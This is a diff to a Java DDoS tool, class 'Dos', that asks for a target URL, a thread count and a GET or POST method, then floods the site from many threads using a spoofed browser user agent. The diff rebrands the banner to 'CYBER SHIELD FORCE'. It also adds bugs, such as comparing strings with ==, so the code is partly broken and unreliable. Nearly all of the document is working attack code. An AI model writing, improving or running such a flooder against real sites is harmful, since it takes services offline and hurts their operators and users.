@@ -5,9 +5,12 @@ import java.util.ArrayList;
 
 import javax.net.ssl.HttpsURLConnection;
 
-public class Dos {
 
-    private final String USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
+public class Dos implements Runnable {
+
+
+
+    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
 
     private static int amount = 0;
     private static String url = "";
@@ -35,15 +38,18 @@ public class Dos {
                     case 4:
                         sslGetAttack(Dos.url);
                         break;
+
                 }
             }
         } catch (Exception e) {
+
         }
     }
 
+
     public static void main(String[] args) throws Exception {
         String url = "";
-        int attackingAmount = 0;
+        int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
         System.out.print("Enter Url: ");
@@ -54,13 +60,13 @@ public class Dos {
         String[] SUrl = url.split("://");
 
         System.out.println("Checking connection to Site");
-        if (SUrl[0].equals("http") || SUrl[0].equals("https")) {
+        if (SUrl[0] == "http" || SUrl[0].equals("http")) {
             dos.checkConnection(url);
         } else {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Setting DDoS By: Shadow Tak");
+        System.out.println("Powerfull DDoS By: CYBER SHIELD FORCE");
 
         System.out.print("Thread: ");
         String amount = in.nextLine();
@@ -74,14 +80,14 @@ public class Dos {
         System.out.print("method: ");
         String option = in.nextLine();
         int ioption = 1;
-        if (option.equals("get") || option.equals("GET")) {
-            if (SUrl[0].equals("http") || SUrl[0].equals("https")) {
+        if (option == "get" || option == "GET") {
+            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                 ioption = 3;
             } else {
                 ioption = 4;
             }
         } else {
-            if (SUrl[0].equals("http") || SUrl[0].equals("https")) {
+            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                 ioption = 1;
             } else {
                 ioption = 2;
@@ -89,6 +95,7 @@ public class Dos {
         }
 
         Thread.sleep(2000);
+
 
         System.out.println("Starting Attack");
         ArrayList<Thread> threads = new ArrayList<Thread>();
@@ -103,6 +110,7 @@ public class Dos {
             try {
                 t.join();
             } catch (Exception e) {
+
             }
         }
         System.out.println("Main Thread ended");
@@ -150,17 +158,17 @@ public class Dos {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("POST attack done!: " + responseCode + " Thread: " + this.seq);
+        System.out.println("POST attack done!: " + responseCode + "Thread: " + this.seq);
     }
 
     private void getAttack(String url) throws Exception {
-        URL obj = aURL(url);
+        URL obj = new URL(url);
         HttpURLConnection con = (HttpURLConnection) obj.openConnection();
         con.setRequestMethod("GET");
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!: " + responseCode + " Thread: " + this.seq);
+        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
     }
 
     private void sslPostAttack(String url) throws Exception {
@@ -177,7 +185,7 @@ public class Dos {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!:" + responseCode + " Thread: " + this.seq);
+        System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -187,6 +195,6 @@ public class Dos {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!: " + responseCode + " Thread: " + this.seq);
+        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
     }
 }
